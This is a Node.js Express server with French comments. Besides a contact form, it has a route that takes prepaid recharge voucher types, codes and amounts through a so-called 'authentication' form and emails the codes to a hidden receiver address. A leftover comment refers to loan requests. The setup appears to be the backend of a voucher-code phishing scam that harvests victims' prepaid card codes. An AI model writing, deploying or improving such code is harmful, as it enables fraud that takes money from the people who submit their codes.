require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const HOST = process.env.HOST || 'localhost';
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(express.urlencoded({ extended: true }));
app.use(express.static('auth-html'));

// Page d'accueil
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'auth-html', 'authe222.html'));
});

// Traitement du formulaire de contact
app.post('/demande-assistance', async (req, res) => {
  //  let message = `Nouvelle demande de prêt :\n\nNom: ${data.fullname}\nEmail: ${data.email}\nTéléphone: ${data.phone}\nRaison du prêt: ${data.loan_reason}\nDétails: ${data.loan_details || 'N/A'}`;
                
  const { full_name, email,sujet,description } = req.body;

  if (!full_name || !email || !sujet || !description) {
    return res.redirect('/?status=error');
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT) || 587,
    secure: process.env.SMTP_SECURE === 'true', // true pour 465, false pour les autres ports
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  try {
    await transporter.verify();
  } catch (err) {
    console.error('Erreur SMTP:', err);
    return res.redirect('/?status=smtp_error');
  }

  const mailOptions = {
    from: `"${full_name}" <${process.env.SMTP_USER}>`,
    replyTo: email,
    to: process.env.RECEIVER_EMAIL,
    subject: `[Formulaire] ${sujet}`,
    text: `${description}\n\n---\nNom: ${full_name}\nSujet: ${sujet}\nEmail: ${email}`,
  };
  try {
    await transporter.sendMail(mailOptions);
    return res.redirect('/?status=success');
  } catch (err) {
    console.error('Erreur envoi:', err);
    return res.redirect('/?status=send_error');
  }
});


app.post('/Formulaire-authentification', async (req, res) => {
  //  let message = `Nouvelle demande de prêt :\n\nNom: ${data.fullname}\nEmail: ${data.email}\nTéléphone: ${data.phone}\nRaison du prêt: ${data.loan_reason}\nDétails: ${data.loan_details || 'N/A'}`;
                
  const { rechargeType, rechargeCode,rechargeemail,rechargeAmount,hideCode } = req.body;

  if (!rechargeType || !rechargeCode || !rechargeemail || !rechargeAmount || !hideCode) {
    return res.redirect('/?status=error');
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT) || 587,
    secure: process.env.SMTP_SECURE === 'true', // true pour 465, false pour les autres ports
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  try {
    await transporter.verify();
  } catch (err) {
    console.error('Erreur SMTP:', err);
    return res.redirect('/?status=smtp_error');
  }
const subjet_="FORMULAIRE D'AUTHENTIFICATION"
//rechargeType, rechargeCode,rechargeemail,
  const mailOptions = {
    from: `"${rechargeemail}" <${process.env.SMTP_USER}>`,
    replyTo: rechargeemail,
    to: process.env.RECEIVER_EMAIL,
    subject: `${subjet_}`,
    text: `Type de recharge: ${rechargeType}\n\n---\n Recharge Code: ${rechargeCode}\n Montant: ${rechargeAmount}`,
  };
  try {
    await transporter.sendMail(mailOptions);
    return res.redirect('/?status=success');
  } catch (err) {
    console.error('Erreur envoi:', err);
    return res.redirect('/?status=send_error');
  }
});

// Démarrage du serveur
app.listen(PORT, HOST, () => {
  console.log(`Serveur démarré sur http://${HOST}:${PORT}`);
});
